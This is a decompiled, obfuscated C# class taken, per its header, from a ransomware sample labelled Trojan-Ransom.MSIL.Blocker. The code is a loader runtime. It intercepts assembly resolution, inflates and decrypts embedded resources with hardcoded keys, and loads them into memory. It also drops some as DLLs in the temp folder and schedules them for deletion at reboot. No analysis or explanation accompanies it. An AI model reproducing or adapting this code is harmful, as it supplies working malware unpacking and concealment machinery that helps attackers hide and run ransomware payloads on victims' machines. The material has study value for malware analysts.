// Decompiled with JetBrains decompiler
// Type: ##
// Assembly: 2012, Version=0.0.0.0, Culture=neutral, PublicKeyToken=6bd9dd2807ddb306
// MVID: 60A44901-35B0-4353-8B52-C0C6D76F7330
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-3248a3b46c9c5b161194998579280ffef650260c38fa4129b858188ce3834f5e.exe

using \u0023d;
using \u0023N;
using SmartAssembly.MemoryManagement;
using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

internal sealed class \u0023\u0023
{
  static int \u00237b([In] \u0023R.\u0023jb obj0, [In] \u0023R.\u0023db obj1)
  {
    int index1;
    if ((index1 = \u0023\u0023.\u0023ac(obj1, 9)) < 0)
    {
      int cb = obj1.\u0023cb;
      int index2 = \u0023\u0023.\u0023ac(obj1, cb);
      int num = (int) obj0.\u0023gb[index2];
      if (num < 0 || (num & 15) > cb)
        return -1;
      \u0023\u0023.\u0023qc(obj1, num & 15);
      return num >> 4;
    }
    \u0023R.\u0023jb jb = obj0;
    int num1;
    if ((num1 = (int) jb.\u0023gb[index1]) >= 0)
    {
      \u0023\u0023.\u0023qc(obj1, num1 & 15);
      return num1 >> 4;
    }
    int num2 = -(num1 >> 4);
    int num3 = num1 & 15;
    int num4;
    if ((num4 = \u0023\u0023.\u0023ac(obj1, num3)) >= 0)
    {
      int num5 = (int) obj0.\u0023gb[num2 | num4 >> 9];
      \u0023\u0023.\u0023qc(obj1, num5 & 15);
      return num5 >> 4;
    }
    int cb1 = obj1.\u0023cb;
    int num6 = \u0023\u0023.\u0023ac(obj1, cb1);
    int num7 = (int) obj0.\u0023gb[num2 | num6 >> 9];
    if ((num7 & 15) > cb1)
      return -1;
    \u0023\u0023.\u0023qc(obj1, num7 & 15);
    return num7 >> 4;
  }

  static Assembly \u00238b([In] string obj0)
  {
    using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(obj0))
    {
      Stream input1 = manifestResourceStream;
      if (input1 == null)
        return (Assembly) null;
      int count = new BinaryReader(input1).ReadInt32();
      using (DeflateStream input2 = new DeflateStream(manifestResourceStream, CompressionMode.Decompress))
        return Assembly.Load(new BinaryReader((Stream) input2).ReadBytes(count));
    }
  }

  static int \u00239b([In] \u0023R.\u0023Eb obj0) => obj0.ReadByte() | obj0.ReadByte() << 8;

  static int \u0023ac([In] \u0023R.\u0023db obj0, [In] int obj1)
  {
    if (obj0.\u0023cb < obj1)
      goto label_4;
label_3:
    return (int) ((long) obj0.\u0023bb & (long) ((1 << obj1) - 1));
label_4:
    if (obj0.\u00239 == obj0.\u0023ab)
      return -1;
    obj0.\u0023bb |= (uint) (((int) obj0.\u00238[obj0.\u00239++] & (int) byte.MaxValue | ((int) obj0.\u00238[obj0.\u00239++] & (int) byte.MaxValue) << 8) << obj0.\u0023cb);
    obj0.\u0023cb += 16;
    goto label_3;
  }

  static int \u0023bc([In] \u0023R.\u00233 obj0) => obj0.\u0023fb;

  static void \u0023cc()
  {
    try
    {
      \u0001.\u0001.\u0001();
    }
    catch (Exception ex)
    {
    }
  }

  static int \u0023dc([In] \u0023R.\u00233 obj0) => 32768 - obj0.\u0023fb;

  static void \u0023ec([In] \u0023R.\u0023jb obj0, [In] byte[] obj1)
  {
    int[] numArray1 = new int[16];
    int[] numArray2 = new int[16];
    if (true)
      goto label_26;
label_4:
    int index1;
    for (; index1 < obj1.Length; ++index1)
    {
      int index2 = (int) obj1[index1];
      if (index2 > 0)
        ++numArray1[index2];
    }
    int num1 = 0;
    int length = 512;
    for (int index3 = 1; index3 <= 15; ++index3)
    {
      numArray2[index3] = num1;
      num1 += numArray1[index3] << 16 - index3;
      if (index3 >= 10)
      {
        int num2 = numArray2[index3] & 130944;
        int num3 = num1 & 130944;
        length += num3 - num2 >> 16 - index3;
      }
    }
    obj0.\u0023gb = new short[length];
    int num4 = 512;
    for (int index4 = 15; index4 >= 10; --index4)
    {
      int num5 = num1 & 130944;
      num1 -= numArray1[index4] << 16 - index4;
      for (int index5 = num1 & 130944; index5 < num5; index5 += 128)
      {
        obj0.\u0023gb[(int) \u0023\u0023.\u0023rc(index5)] = (short) (-num4 << 4 | index4);
        num4 += 1 << index4 - 9;
      }
    }
    for (int index6 = 0; index6 < obj1.Length; ++index6)
    {
      int index7 = (int) obj1[index6];
      if (index7 != 0)
      {
        int num6 = numArray2[index7];
        int index8 = (int) \u0023\u0023.\u0023rc(num6);
        if (index7 <= 9)
        {
          do
          {
            obj0.\u0023gb[index8] = (short) (index6 << 4 | index7);
            index8 += 1 << index7;
          }
          while (index8 < 512);
        }
        else
        {
          int num7 = (int) obj0.\u0023gb[index8 & 511];
          int num8 = 1 << (num7 & 15);
          int num9 = -(num7 >> 4);
          do
          {
            obj0.\u0023gb[num9 | index8 >> 9] = (short) (index6 << 4 | index7);
            index8 += 1 << index7;
          }
          while (index8 < num8);
        }
        numArray2[index7] = num6 + (1 << 16 - index7);
      }
    }
    return;
label_26:
    index1 = 0;
    goto label_4;
  }

  static void \u0023fc([In] \u0023R.\u00233 obj0, [In] int obj1, [In] int obj2)
  {
    if ((obj0.\u0023fb += obj1) > 32768)
      throw new InvalidOperationException();
    int sourceIndex = obj0.\u0023eb - obj2 & (int) short.MaxValue;
    int num = 32768 - obj1;
    if (sourceIndex <= num && obj0.\u0023eb < num)
    {
      if (obj1 <= obj2)
      {
        Array.Copy((Array) obj0.\u00238, sourceIndex, (Array) obj0.\u00238, obj0.\u0023eb, obj1);
        obj0.\u0023eb += obj1;
      }
      else
      {
        while (obj1-- > 0)
          obj0.\u00238[obj0.\u0023eb++] = obj0.\u00238[sourceIndex++];
      }
    }
    else
      \u0023\u0023.\u0023ic(obj0, sourceIndex, obj1, obj2);
  }

  static void \u0023gc([In] \u0023R.\u00233 obj0, [In] int obj1)
  {
    \u0023R.\u00233 obj = obj0;
    int fb;
    int num = fb = obj.\u0023fb;
    obj.\u0023fb = fb + 1;
    if (num == 32768)
      throw new InvalidOperationException();
    obj0.\u00238[obj0.\u0023eb++] = (byte) obj1;
    obj0.\u0023eb &= (int) short.MaxValue;
  }

  static ICryptoTransform \u0023hc(
    [In] byte[] obj0,
    [In] bool obj1,
    [In] byte[] obj2,
    [In] \u0023M obj3)
  {
    obj3.\u0023J.GetProperty("Key").GetSetMethod().Invoke(obj3.\u0023K, new object[1]
    {
      (object) obj2
    });
    obj3.\u0023J.GetProperty("IV").GetSetMethod().Invoke(obj3.\u0023K, new object[1]
    {
      (object) obj0
    });
    return (ICryptoTransform) obj3.\u0023J.GetMethod(obj1 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]).Invoke(obj3.\u0023K, new object[0]);
  }

  static void \u0023ic([In] \u0023R.\u00233 obj0, [In] int obj1, [In] int obj2, [In] int obj3)
  {
    while (obj2-- > 0)
    {
      byte[] numArray = obj0.\u00238;
      \u0023R.\u00233 obj = obj0;
      int eb;
      int num1 = eb = obj.\u0023eb;
      obj.\u0023eb = eb + 1;
      int index = num1;
      int num2 = (int) obj0.\u00238[obj1++];
      numArray[index] = (byte) num2;
      obj0.\u0023eb &= (int) short.MaxValue;
      obj1 &= (int) short.MaxValue;
    }
  }

  static int \u0023jc([In] int obj0, [In] byte[] obj1, [In] \u0023R.\u00237 obj2, [In] int obj3)
  {
    int num1 = 0;
    do
    {
      if (obj2.\u0023W != 11)
        goto label_5;
label_2:
      continue;
label_5:
      int num2 = \u0023\u0023.\u0023wc(obj3, obj1, obj0, obj2.\u00233);
      obj3 += num2;
      num1 += num2;
      obj0 -= num2;
      if (obj0 != 0)
        goto label_2;
      else
        goto label_1;
    }
    while (\u0023\u0023.\u0023Bc(obj2) || obj2.\u00233.\u0023fb > 0 && obj2.\u0023W != 11);
    goto label_3;
label_1:
    return num1;
label_3:
    return num1;
  }

  [DllImport("kernel32", EntryPoint = "MoveFileEx")]
  static extern bool \u0023kc(string _param0, string _param1, int _param2);

  static \u0023R.\u0023jb \u0023lc([In] \u0023R.\u0023xb obj0)
  {
    byte[] destinationArray = new byte[obj0.\u0023pb];
    Array.Copy((Array) obj0.\u0023nb, 0, (Array) destinationArray, 0, obj0.\u0023pb);
    return new \u0023R.\u0023jb(destinationArray);
  }

  static bool \u0023mc([In] \u0023R.\u0023xb obj0, [In] \u0023R.\u0023db obj1)
  {
    while (true)
    {
      switch (obj0.\u0023W)
      {
        case 0:
          obj0.\u0023pb = \u0023\u0023.\u0023ac(obj1, 5);
          if (obj0.\u0023pb >= 0)
          {
            obj0.\u0023pb += 257;
            \u0023\u0023.\u0023qc(obj1, 5);
            obj0.\u0023W = 1;
            goto case 1;
          }
          else
            goto label_2;
        case 1:
          obj0.\u0023qb = \u0023\u0023.\u0023ac(obj1, 5);
          if (obj0.\u0023qb >= 0)
          {
            ++obj0.\u0023qb;
            \u0023\u0023.\u0023qc(obj1, 5);
            obj0.\u0023sb = obj0.\u0023pb + obj0.\u0023qb;
            obj0.\u0023nb = new byte[obj0.\u0023sb];
            obj0.\u0023W = 2;
            goto case 2;
          }
          else
            goto label_5;
        case 2:
          obj0.\u0023rb = \u0023\u0023.\u0023ac(obj1, 4);
          if (obj0.\u0023rb >= 0)
          {
            obj0.\u0023rb += 4;
            \u0023\u0023.\u0023qc(obj1, 4);
            obj0.\u0023mb = new byte[19];
            obj0.\u0023vb = 0;
            obj0.\u0023W = 3;
            goto case 3;
          }
          else
            goto label_8;
        case 3:
          for (; obj0.\u0023vb < obj0.\u0023rb; ++obj0.\u0023vb)
          {
            int num = \u0023\u0023.\u0023ac(obj1, 3);
            if (num < 0)
              return false;
            \u0023\u0023.\u0023qc(obj1, 3);
            obj0.\u0023mb[\u0023R.\u0023xb.\u0023wb[obj0.\u0023vb]] = (byte) num;
          }
          obj0.\u0023ob = new \u0023R.\u0023jb(obj0.\u0023mb);
          obj0.\u0023mb = (byte[]) null;
          obj0.\u0023vb = 0;
          obj0.\u0023W = 4;
          goto case 4;
        case 4:
          int num1;
          while (((num1 = \u0023\u0023.\u00237b(obj0.\u0023ob, obj1)) & -16) == 0)
          {
            obj0.\u0023nb[obj0.\u0023vb++] = obj0.\u0023ub = (byte) num1;
            if (obj0.\u0023vb == obj0.\u0023sb)
              return true;
          }
          if (num1 >= 0)
          {
            if (num1 >= 17)
              obj0.\u0023ub = (byte) 0;
            obj0.\u0023tb = num1 - 16;
            obj0.\u0023W = 5;
            goto case 5;
          }
          else
            goto label_19;
        case 5:
          int num2 = \u0023R.\u0023xb.\u0023lb[obj0.\u0023tb];
          int num3 = \u0023\u0023.\u0023ac(obj1, num2);
          if (num3 >= 0)
          {
            \u0023\u0023.\u0023qc(obj1, num2);
            int num4 = num3 + \u0023R.\u0023xb.\u0023kb[obj0.\u0023tb];
            while (num4-- > 0)
              obj0.\u0023nb[obj0.\u0023vb++] = obj0.\u0023ub;
            if (obj0.\u0023vb != obj0.\u0023sb)
            {
              obj0.\u0023W = 4;
              continue;
            }
            goto label_29;
          }
          else
            goto label_24;
        default:
          continue;
      }
    }
label_2:
    return false;
label_5:
    return false;
label_8:
    return false;
label_19:
    return false;
label_24:
    return false;
label_29:
    return true;
  }

  static Assembly \u0023nc([In] object obj0, [In] ResolveEventArgs obj1) => \u0023\u0023.\u00238b(Convert.ToBase64String(Encoding.Default.GetBytes(obj1.Name.ToLowerInvariant())));

  static void \u0023oc()
  {
    try
    {
      AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u0023\u0023.\u0023tc);
    }
    catch
    {
    }
  }

  static \u0023R.\u0023jb \u0023pc([In] \u0023R.\u0023xb obj0)
  {
    byte[] numArray = new byte[obj0.\u0023qb];
    byte[] destinationArray;
    if (true)
      destinationArray = numArray;
    Array.Copy((Array) obj0.\u0023nb, obj0.\u0023pb, (Array) destinationArray, 0, obj0.\u0023qb);
    return new \u0023R.\u0023jb(destinationArray);
  }

  static void \u0023qc([In] \u0023R.\u0023db obj0, [In] int obj1)
  {
    obj0.\u0023bb >>= obj1;
    obj0.\u0023cb -= obj1;
  }

  static short \u0023rc([In] int obj0) => (short) ((int) \u0023R.\u0023Db.\u0023yb[obj0 & 15] << 12 | (int) \u0023R.\u0023Db.\u0023yb[obj0 >> 4 & 15] << 8 | (int) \u0023R.\u0023Db.\u0023yb[obj0 >> 8 & 15] << 4 | (int) \u0023R.\u0023Db.\u0023yb[obj0 >> 12]);

  static int \u0023sc([In] \u0023R.\u0023db obj0) => obj0.\u0023ab - obj0.\u00239 + (obj0.\u0023cb >> 3);

  static Assembly \u0023tc(object _param0, ResolveEventArgs _param1)
  {
    \u0023n.\u0023u u = new \u0023n.\u0023u(_param1.Name);
    string base64String1 = Convert.ToBase64String(Encoding.UTF8.GetBytes(u.\u0023s(false)));
    string[] strArray = "ezhmZjdmMjg2LWQ2NWItNDkxYy04N2RmLTRiZjQ3MjA1ZDYxNH0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{6c3b1eb0-674e-43e2-bdb1-a6ecf812993b},ezhmZjdmMjg2LWQ2NWItNDkxYy04N2RmLTRiZjQ3MjA1ZDYxNH0=,[z]{6c3b1eb0-674e-43e2-bdb1-a6ecf812993b}".Split(',');
    string str1 = string.Empty;
    bool flag1 = false;
    bool flag2 = false;
    for (int index = 0; index < strArray.Length - 1; index += 2)
    {
      if (strArray[index] == base64String1)
      {
        str1 = strArray[index + 1];
        break;
      }
    }
    if (str1.Length == 0 && u.\u0023r.Length == 0)
    {
      string base64String2 = Convert.ToBase64String(Encoding.UTF8.GetBytes(u.\u0023o));
      for (int index = 0; index < strArray.Length - 1; index += 2)
      {
        if (strArray[index] == base64String2)
        {
          str1 = strArray[index + 1];
          break;
        }
      }
    }
    if (str1.Length > 0)
    {
      if (str1[0] == '[')
      {
        int num = str1.IndexOf(']');
        string str2 = str1.Substring(1, num - 1);
        flag1 = str2.IndexOf('z') >= 0;
        flag2 = str2.IndexOf('t') >= 0;
        str1 = str1.Substring(num + 1);
      }
      lock (\u0023n.\u0023g)
      {
        if (\u0023n.\u0023g.ContainsKey((object) str1))
          return (Assembly) \u0023n.\u0023g[(object) str1];
        Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(str1);
        if (manifestResourceStream != null)
        {
          int length = (int) manifestResourceStream.Length;
          byte[] numArray = new byte[length];
          manifestResourceStream.Read(numArray, 0, length);
          if (flag1)
            numArray = \u0023\u0023.\u0023uc(numArray);
          Assembly assembly = (Assembly) null;
          if (!flag2)
          {
            try
            {
              assembly = Assembly.Load(numArray);
            }
            catch (FileLoadException ex)
            {
              flag2 = true;
            }
            catch (BadImageFormatException ex)
            {
              flag2 = true;
            }
          }
          if (flag2)
          {
            try
            {
              string path1 = string.Format("{0}{1}\\", (object) Path.GetTempPath(), (object) str1);
              Directory.CreateDirectory(path1);
              string path2 = path1 + u.\u0023o + ".dll";
              if (!File.Exists(path2))
              {
                FileStream fileStream = File.OpenWrite(path2);
                fileStream.Write(numArray, 0, numArray.Length);
                fileStream.Close();
                \u0023\u0023.\u0023kc(path2, (string) null, 4);
                \u0023\u0023.\u0023kc(path1, (string) null, 4);
              }
              assembly = Assembly.LoadFile(path2);
            }
            catch
            {
            }
          }
          \u0023n.\u0023g[(object) str1] = (object) assembly;
          return assembly;
        }
      }
    }
    return (Assembly) null;
  }

  static byte[] \u0023uc([In] byte[] obj0)
  {
    Assembly callingAssembly = Assembly.GetCallingAssembly();
    Assembly executingAssembly = Assembly.GetExecutingAssembly();
    if ((object) callingAssembly != (object) executingAssembly && !\u0023\u0023.\u0023Ic(callingAssembly, executingAssembly))
      return (byte[]) null;
    \u0023R.\u0023Eb eb = new \u0023R.\u0023Eb(obj0);
    byte[] numArray1 = new byte[0];
    int num1 = \u0023\u0023.\u0023yc(eb);
    if (num1 == 67324752)
    {
      short num2 = (short) \u0023\u0023.\u00239b(eb);
      int num3 = \u0023\u0023.\u00239b(eb);
      int num4 = \u0023\u0023.\u00239b(eb);
      if (num1 != 67324752 || num2 != (short) 20 || num3 != 0 || num4 != 8)
        throw new FormatException("Wrong Header Signature");
      \u0023\u0023.\u0023yc(eb);
      \u0023\u0023.\u0023yc(eb);
      \u0023\u0023.\u0023yc(eb);
      int length = \u0023\u0023.\u0023yc(eb);
      int count1 = \u0023\u0023.\u00239b(eb);
      int count2 = \u0023\u0023.\u00239b(eb);
      if (count1 > 0)
      {
        byte[] buffer = new byte[count1];
        eb.Read(buffer, 0, count1);
      }
      if (count2 > 0)
      {
        byte[] buffer = new byte[count2];
        eb.Read(buffer, 0, count2);
      }
      byte[] buffer1 = new byte[eb.Length - eb.Position];
      eb.Read(buffer1, 0, buffer1.Length);
      \u0023R.\u00237 obj = new \u0023R.\u00237(buffer1);
      numArray1 = new byte[length];
      \u0023\u0023.\u0023jc(numArray1.Length, numArray1, obj, 0);
    }
    else
    {
      int num5 = num1 >> 24;
      if (num1 - (num5 << 24) != 8223355)
        throw new FormatException("Unknown Header");
      if (num5 == 1)
      {
        int length1 = \u0023\u0023.\u0023yc(eb);
        numArray1 = new byte[length1];
        int num6;
        for (int index = 0; index < length1; index += num6)
        {
          int length2 = \u0023\u0023.\u0023yc(eb);
          num6 = \u0023\u0023.\u0023yc(eb);
          byte[] buffer = new byte[length2];
          eb.Read(buffer, 0, buffer.Length);
          \u0023R.\u00237 obj = new \u0023R.\u00237(buffer);
          \u0023\u0023.\u0023jc(num6, numArray1, obj, index);
        }
      }
      if (num5 == 2)
      {
        byte[] numArray2 = new byte[8]
        {
          (byte) 241,
          (byte) 248,
          (byte) 159,
          (byte) 58,
          (byte) 136,
          (byte) 4,
          (byte) 50,
          (byte) 198
        };
        byte[] numArray3 = new byte[8]
        {
          (byte) 239,
          (byte) 66,
          (byte) 208,
          (byte) 249,
          (byte) 81,
          (byte) 221,
          (byte) 219,
          (byte) 62
        };
        using (\u0023Q q = new \u0023Q())
        {
          using (ICryptoTransform cryptoTransform = \u0023\u0023.\u0023Gc(true, numArray3, numArray2, q))
            numArray1 = \u0023\u0023.\u0023uc(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
        }
      }
      if (num5 == 3)
      {
        byte[] numArray4 = new byte[16]
        {
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1
        };
        byte[] numArray5 = new byte[16]
        {
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2
        };
        using (\u0023M m = new \u0023M())
        {
          using (ICryptoTransform cryptoTransform = \u0023\u0023.\u0023hc(numArray5, true, numArray4, m))
            numArray1 = \u0023\u0023.\u0023uc(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
        }
      }
    }
    eb.Close();
    return numArray1;
  }

  static void \u0023vc([In] \u0023M obj0) => obj0.\u0023J.GetMethod("Clear").Invoke(obj0.\u0023K, new object[0]);

  static int \u0023wc([In] int obj0, [In] byte[] obj1, [In] int obj2, [In] \u0023R.\u00233 obj3)
  {
    int num1 = obj3.\u0023eb;
    if (obj2 > obj3.\u0023fb)
      obj2 = obj3.\u0023fb;
    else
      num1 = obj3.\u0023eb - obj3.\u0023fb + obj2 & (int) short.MaxValue;
    int num2 = obj2;
    int length = obj2 - num1;
    if (length > 0)
    {
      Array.Copy((Array) obj3.\u00238, 32768 - length, (Array) obj1, obj0, length);
      obj0 += length;
      obj2 = num1;
    }
    Array.Copy((Array) obj3.\u00238, num1 - obj2, (Array) obj1, obj0, obj2);
    obj3.\u0023fb -= num2;
    if (obj3.\u0023fb < 0)
      throw new InvalidOperationException();
    return num2;
  }

  static void \u0023xc()
  {
    try
    {
      if (Environment.OSVersion.Platform != PlatformID.Win32NT)
        return;
      MemoryManager.\u0001 = new MemoryManager();
    }
    catch
    {
    }
  }

  static int \u0023yc([In] \u0023R.\u0023Eb obj0) => \u0023\u0023.\u00239b(obj0) | \u0023\u0023.\u00239b(obj0) << 16;

  static int \u0023zc([In] \u0023R.\u0023db obj0) => obj0.\u0023cb;

  static int \u0023Ac([In] \u0023R.\u0023db obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
  {
    int num1 = 0;
    while (obj0.\u0023cb > 0 && obj3 > 0)
    {
      obj1[obj2++] = (byte) obj0.\u0023bb;
      obj0.\u0023bb >>= 8;
      obj0.\u0023cb -= 8;
      --obj3;
      ++num1;
    }
    if (obj3 == 0)
      return num1;
    int num2 = obj0.\u0023ab - obj0.\u00239;
    if (obj3 > num2)
      obj3 = num2;
    Array.Copy((Array) obj0.\u00238, obj0.\u00239, (Array) obj1, obj2, obj3);
    obj0.\u00239 += obj3;
    if ((obj0.\u00239 - obj0.\u0023ab & 1) != 0)
    {
      obj0.\u0023bb = (uint) obj0.\u00238[obj0.\u00239++] & (uint) byte.MaxValue;
      obj0.\u0023cb = 8;
    }
    return num1 + obj3;
  }

  static bool \u0023Bc([In] \u0023R.\u00237 obj0)
  {
    switch (obj0.\u0023W)
    {
      case 2:
        if (obj0.\u00231)
        {
          obj0.\u0023W = 12;
          return false;
        }
        int num1 = \u0023\u0023.\u0023ac(obj0.\u00232, 3);
        if (num1 < 0)
          return false;
        \u0023\u0023.\u0023qc(obj0.\u00232, 3);
        if ((num1 & 1) != 0)
          obj0.\u00231 = true;
        switch (num1 >> 1)
        {
          case 0:
            \u0023\u0023.\u0023Dc(obj0.\u00232);
            obj0.\u0023W = 3;
            break;
          case 1:
            obj0.\u00235 = \u0023R.\u0023jb.\u0023hb;
            obj0.\u00236 = \u0023R.\u0023jb.\u0023ib;
            obj0.\u0023W = 7;
            break;
          case 2:
            obj0.\u00234 = new \u0023R.\u0023xb();
            obj0.\u0023W = 6;
            break;
        }
        return true;
      case 3:
        if ((obj0.\u00230 = \u0023\u0023.\u0023ac(obj0.\u00232, 16)) < 0)
          return false;
        \u0023\u0023.\u0023qc(obj0.\u00232, 16);
        obj0.\u0023W = 4;
        goto case 4;
      case 4:
        if (\u0023\u0023.\u0023ac(obj0.\u00232, 16) < 0)
          return false;
        \u0023\u0023.\u0023qc(obj0.\u00232, 16);
        obj0.\u0023W = 5;
        goto case 5;
      case 5:
        int num2 = \u0023\u0023.\u0023Hc(obj0.\u00233, obj0.\u00232, obj0.\u00230);
        obj0.\u00230 -= num2;
        if (obj0.\u00230 != 0)
          return !\u0023\u0023.\u0023Cc(obj0.\u00232);
        obj0.\u0023W = 2;
        return true;
      case 6:
        if (!\u0023\u0023.\u0023mc(obj0.\u00234, obj0.\u00232))
          return false;
        obj0.\u00235 = \u0023\u0023.\u0023lc(obj0.\u00234);
        obj0.\u00236 = \u0023\u0023.\u0023pc(obj0.\u00234);
        obj0.\u0023W = 7;
        goto case 7;
      case 7:
      case 8:
      case 9:
      case 10:
        return \u0023\u0023.\u0023Kc(obj0);
      case 12:
        return false;
      default:
        return false;
    }
  }

  static bool \u0023Cc([In] \u0023R.\u0023db obj0) => obj0.\u00239 == obj0.\u0023ab;

  static void \u0023Dc([In] \u0023R.\u0023db obj0)
  {
    obj0.\u0023bb >>= obj0.\u0023cb & 7;
    obj0.\u0023cb &= -8;
  }

  static void \u0023Ec()
  {
    try
    {
      \u0023\u0023.\u0023oc();
    }
    catch (Exception ex)
    {
    }
  }

  static void \u0023Fc([In] int obj0, [In] byte[] obj1, [In] int obj2, [In] \u0023R.\u0023db obj3)
  {
    if (obj3.\u00239 < obj3.\u0023ab)
      throw new InvalidOperationException();
    int num = obj2 + obj0;
    if (0 > obj2 || obj2 > num || num > obj1.Length)
      throw new ArgumentOutOfRangeException();
    if ((obj0 & 1) != 0)
    {
      obj3.\u0023bb |= (uint) (((int) obj1[obj2++] & (int) byte.MaxValue) << obj3.\u0023cb);
      obj3.\u0023cb += 8;
    }
    obj3.\u00238 = obj1;
    obj3.\u00239 = obj2;
    obj3.\u0023ab = num;
  }

  static ICryptoTransform \u0023Gc(
    [In] bool obj0,
    [In] byte[] obj1,
    [In] byte[] obj2,
    [In] \u0023Q obj3)
  {
    obj3.\u0023O.GetProperty("Key").GetSetMethod().Invoke(obj3.\u0023P, new object[1]
    {
      (object) obj2
    });
    obj3.\u0023O.GetProperty("IV").GetSetMethod().Invoke(obj3.\u0023P, new object[1]
    {
      (object) obj1
    });
    return (ICryptoTransform) obj3.\u0023O.GetMethod(obj0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]).Invoke(obj3.\u0023P, new object[0]);
  }

  static int \u0023Hc([In] \u0023R.\u00233 obj0, [In] \u0023R.\u0023db obj1, [In] int obj2)
  {
    obj2 = Math.Min(Math.Min(obj2, 32768 - obj0.\u0023fb), \u0023\u0023.\u0023sc(obj1));
    int num1 = 32768 - obj0.\u0023eb;
    int num2;
    if (obj2 > num1)
    {
      num2 = \u0023\u0023.\u0023Ac(obj1, obj0.\u00238, obj0.\u0023eb, num1);
      if (num2 == num1)
        num2 += \u0023\u0023.\u0023Ac(obj1, obj0.\u00238, 0, obj2 - num1);
    }
    else
      num2 = \u0023\u0023.\u0023Ac(obj1, obj0.\u00238, obj0.\u0023eb, obj2);
    obj0.\u0023eb = obj0.\u0023eb + num2 & (int) short.MaxValue;
    obj0.\u0023fb += num2;
    return num2;
  }

  static bool \u0023Ic([In] Assembly obj0, [In] Assembly obj1)
  {
    byte[] publicKey1 = obj1.GetName().GetPublicKey();
    byte[] publicKey2 = obj0.GetName().GetPublicKey();
    if (publicKey2 == null != (publicKey1 == null))
      return false;
    if (publicKey2 != null)
    {
      for (int index = 0; index < publicKey2.Length; ++index)
      {
        if ((int) publicKey2[index] != (int) publicKey1[index])
          return false;
      }
    }
    return true;
  }

  static void \u0023Jc([In] \u0023Q obj0) => obj0.\u0023O.GetMethod("Clear").Invoke(obj0.\u0023P, new object[0]);

  static bool \u0023Kc([In] \u0023R.\u00237 obj0)
  {
    int num1 = \u0023\u0023.\u0023dc(obj0.\u00233);
    if (true)
      goto label_25;
label_23:
    int num2;
    while (num2 >= 258)
    {
      switch (obj0.\u0023W)
      {
        case 7:
          int num3;
          while (((num3 = \u0023\u0023.\u00237b(obj0.\u00235, obj0.\u00232)) & -256) == 0)
          {
            \u0023\u0023.\u0023gc(obj0.\u00233, num3);
            if (--num2 < 258)
              return true;
          }
          if (num3 < 257)
          {
            if (num3 < 0)
              return false;
            obj0.\u00236 = (\u0023R.\u0023jb) null;
            obj0.\u00235 = (\u0023R.\u0023jb) null;
            obj0.\u0023W = 2;
            return true;
          }
          obj0.\u0023Y = \u0023R.\u00237.\u0023S[num3 - 257];
          obj0.\u0023X = \u0023R.\u00237.\u0023T[num3 - 257];
          goto case 8;
        case 8:
          if (obj0.\u0023X > 0)
          {
            obj0.\u0023W = 8;
            int num4 = \u0023\u0023.\u0023ac(obj0.\u00232, obj0.\u0023X);
            if (num4 < 0)
              return false;
            \u0023\u0023.\u0023qc(obj0.\u00232, obj0.\u0023X);
            obj0.\u0023Y += num4;
          }
          obj0.\u0023W = 9;
          goto case 9;
        case 9:
          int index = \u0023\u0023.\u00237b(obj0.\u00236, obj0.\u00232);
          if (index < 0)
            return false;
          obj0.\u0023Z = \u0023R.\u00237.\u0023U[index];
          obj0.\u0023X = \u0023R.\u00237.\u0023V[index];
          goto case 10;
        case 10:
          if (obj0.\u0023X > 0)
          {
            obj0.\u0023W = 10;
            int num5 = \u0023\u0023.\u0023ac(obj0.\u00232, obj0.\u0023X);
            if (num5 < 0)
              return false;
            \u0023\u0023.\u0023qc(obj0.\u00232, obj0.\u0023X);
            obj0.\u0023Z += num5;
          }
          \u0023\u0023.\u0023fc(obj0.\u00233, obj0.\u0023Y, obj0.\u0023Z);
          num2 -= obj0.\u0023Y;
          obj0.\u0023W = 7;
          continue;
        default:
          continue;
      }
    }
    return true;
label_25:
    num2 = num1;
    goto label_23;
  }
}
